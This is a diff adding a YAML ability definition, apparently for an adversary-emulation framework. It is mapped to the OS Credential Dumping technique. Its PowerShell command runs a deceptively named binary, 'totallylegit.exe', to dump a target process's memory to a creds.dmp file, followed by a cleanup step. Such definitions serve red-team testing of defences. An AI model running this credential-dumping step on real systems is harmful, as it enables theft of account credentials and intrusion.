@@ -1,0 +1,21 @@
+- id: 3c647015-ab0a-496a-8847-6ab173cd2b22
+  name: MiniDumpWriteDump (Spooky)
+  description: Custom GO credential dumper using minidumpwritedump
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: OS Credential Dumping
+  platforms:
+    windows:
+      psh:
+        command: |
+          .\totallylegit.exe #{host.process.id} C:\Users\Public\creds.dmp
+        payloads:
+        - totallylegit.exe
+        cleanup: |
+          if (Test-Path "C:\Users\Public\creds.dmp") {
+            rm "C:\Users\Public\creds.dmp" -Force;
+          };
+  requirements:
+  - plugins.stockpile.app.requirements.paw_provenance:
+    - source: host.process.id
